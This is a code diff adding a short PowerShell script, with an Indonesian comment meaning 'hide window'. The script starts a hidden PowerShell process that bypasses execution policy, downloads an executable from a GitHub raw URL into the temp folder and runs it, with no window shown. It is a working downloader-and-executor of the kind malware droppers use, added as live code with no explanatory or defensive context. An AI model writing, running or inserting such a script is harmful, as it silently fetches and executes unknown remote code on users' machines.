@@ -1,0 +1,11 @@
+$url = "https://raw.githubusercontent.com/devilJM/m/main/m"
+$savePath = [System.IO.Path]::Combine($env:TEMP, "downloaded.exe")
+
+# Sembunyikan Jendela
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell"
+$psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$url' -OutFile '$savePath'; if (Test-Path '$savePath') { Start-Process '$savePath' }`""
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+
+[System.Diagnostics.Process]::Start($psi) | Out-Null
